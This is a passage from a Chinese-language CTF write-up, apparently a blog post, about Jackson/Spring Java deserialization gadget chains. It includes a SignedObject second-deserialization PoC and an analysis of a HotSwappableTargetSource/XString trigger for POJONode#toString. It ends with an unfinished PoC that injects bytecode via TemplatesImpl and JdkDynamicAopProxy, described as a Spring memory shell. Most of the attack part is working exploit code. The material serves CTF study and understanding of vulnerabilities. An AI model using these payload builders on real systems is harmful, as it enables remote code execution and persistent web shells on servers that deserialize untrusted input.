</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SignedObject</span><span class="w"> </span><span class="n">signedObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SignedObject</span><span class="p">(</span><span class="n">badAttributeValueExpException</span><span class="p">,</span><span class="n">privateKey</span><span class="p">,</span><span class="n">signingEngine</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">signedObject</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">bad</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">bad</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">,</span><span class="n">node</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">bos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">bos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">bad</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">serializedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bos</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">base64EncodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">encodeBase64</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">base64EncodedBytes</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">base64EncodedData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">decodedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">decodeBase64</span><span class="p">(</span><span class="n">base64EncodedData</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 反序列化</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayInputStream</span><span class="w"> </span><span class="n">bis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">serializedBytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">bis</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFiled</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">templates</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">values</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchFieldException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">declaredField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">templates</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="n">values</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h1 id="0x07-另一种触发tostring">0x07 另一种触发tostring<a hidden class="anchor" aria-hidden="true" href="#0x07-另一种触发tostring">#</a></h1>
<p>除了用上面CC5来触发tostring方法还有其他链子，<code>org.springframework.aop.target.HotSwappableTargetSource.java</code>(<code>HSTS</code>)，这个类是spring aop模块的</p>
<p>这里是看<a href="https://xiinnn.com/posts/2023zjctf-pre-secobj/#signedobject%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%94%A8hsts%E5%A5%97%E5%A8%83%E8%A7%A6%E5%8F%91">secobj</a>这道和jackson相关的反序列化题接触到的，这里看到链子</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HashMap</span><span class="err">#</span><span class="n">readObject</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">HashMap</span><span class="err">#</span><span class="n">putVal</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="err">#</span><span class="n">equals</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">XString</span><span class="err">#</span><span class="n">equals</span><span class="w"> </span><span class="o">-&gt;</span><span class="n">POJONode</span><span class="err">#</span><span class="n">toString</span><span class="w">
</span></span></span></code></pre></div><p>这个是前面的触发的<code>利用连</code>，我们简单分析下链子，我第一眼看这个链子就想为啥要<code>HotSwappableTargetSource#equals</code>这步，直接<code>XString#equals</code>不好么。我们开始分析</p>
<p>一开始我就遇到了困难点，我是调用<code>else</code>中的<code>key.equals(k)</code>来触发后面的链子，但是我们进入else并不容易</p>
<p><img loading="lazy" src="../images/image-20241202111608200.png" alt="image-20241202111608200"  />
</p>
<h3 id="问题1-putval">问题1 putVal<a hidden class="anchor" aria-hidden="true" href="#问题1-putval">#</a></h3>
<ol>
<li>tab</li>
</ol>
<p>这里可以看到<code>p</code>是从<code>tab</code>中取值的，其中<code>i</code>还是通过<code>and和hash运算</code>，这里明显一次putVal方法不够，我们第一次给<code>tab[i]</code>,第二次调用第一次的<code>tab[i]</code></p>
<p><strong>Hashmap#readObject</strong> 中也是for调用<code>putVal</code>，上面想法可以实现</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mappings</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&#34;unchecked&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@SuppressWarnings</span><span class="p">(</span><span class="s">&#34;unchecked&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">putVal</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><ol start="2">
<li>mappings</li>
</ol>
<p>通过<code>putVal()</code>中的代码，我们知道要进入else，<strong><code>第二次的i要和第一次的i一样</code></strong>，才能让</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">(</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tab</span><span class="o">[</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">hash</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w">  </span><span class="p">(</span><span class="n">这里是不等于</span><span class="err">，</span><span class="n">md格式的问题</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></div><p>及两次的<code>key的hash</code>值要一样，也就是间接key要一样咯？，但是赋值直接put的话，只会有一对值，覆盖第一个value。而put也是调用的<code>putVal()</code>，会判断key的hash，一样的话并不会多加一对值。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="nf">put</span><span class="p">(</span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">putVal</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>这里主要原因是这个<code>hash值</code>，所以我们第二值可以直接用这个<code>putVal()来赋值</code>，hash我们可以随便设置，因为readObject的时候，<code>hash值</code>还是去通过<code>hash(key)</code>去获取的，并不影响</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">HashMap</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">hotSwappableTargetSource2</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//hashMap.put(hotSwappableTargetSource,&#34;222&#34;);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">putVal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashMap</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;putVal&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">boolean</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">putVal</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="n">123</span><span class="p">,</span><span class="n">hotSwappableTargetSource</span><span class="p">,</span><span class="s">&#34;222&#34;</span><span class="p">,</span><span class="kc">false</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><ol start="3">
<li>key</li>
</ol>
<p>hash的问题解决了，有个<code>究极问题</code>（两次的key不能相等）</p>
<p>看到这里进入else之后的这个<code>if判断</code>，这里<code>||</code>如果前面为<code>true</code>了的话就<code>不会执行后面的key.equals(k)</code>方法进行判断了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="na">hash</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">((</span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="na">key</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">k</span><span class="p">))))</span><span class="w">
</span></span></span></code></pre></div><p>Hashmap#hash</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hash</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">hashCode</span><span class="p">())</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">16</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>但是常规思路，这个是不可能的，<strong>因为hash值要一样意味着key一样，而这里却要key不相同！——！</strong>，除非他<code>hashCode()</code>有黑魔法嘿嘿</p>
<p><strong>这里也就是为什么要套一层HSTS的原因</strong></p>
<h3 id="hsts-我的神">HSTS 我的神<a hidden class="anchor" aria-hidden="true" href="#hsts-我的神">#</a></h3>
<p>这家伙<code>hashCode</code>方法完美解决的了这个问题，其返回的是一个<code>固定值</code>我去（不知道为什么这么设计，从逻辑上看其实算个缺陷，不符合逻辑呀hhh）</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">hashCode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>所以这里key都用<code>HotSwappableTargetSource</code></p>
<p>后面就比较顺利了，没什么问题，这里注意下第一个<code>XString</code>要用<code>String那个构造方法</code>，因为<code>str()里String转义</code>可能报错中断</p>
<p><img loading="lazy" src="../images/image-20241202115114191.png" alt="image-20241202115114191"  />
</p>
<h2 id="poc">poc<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h2>
<p>这里poc还夹杂着<code>SignedObject</code>(二次反序列化)和<code>JdkDynamicAopProxy</code>(稳定触发getOutputProperties)，<code>spring内存马</code></p>
<p>因为题目需要这些，然后相关代码和附件我也会放到poc下面</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.node.POJONode</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.govuln.shiroattack.Evil</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xml.internal.utils.XMLString</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xpath.internal.objects.XString</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.tomcat.util.codec.binary.Base64</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.target.HotSwappableTargetSource</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.TransformerConfigurationException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.security.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Properties</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jackson</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">pool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">clazzs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">Interceptor_demo</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazzs</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//System.out.println(Base64.getEncoder().encodeToString(code));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;111&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">code</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFiled</span><span class="p">(</span><span class="n">templates</span><span class="p">,</span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">POJONode</span><span class="w"> </span><span class="n">jsonNodes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BadAttributeValueExpException</span><span class="w"> </span><span class="n">badAttributeValueExpException</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">BadAttributeValueExpException</span><span class="p">(</span><span class="n">111</span><span class="p">);</span><span class="w">
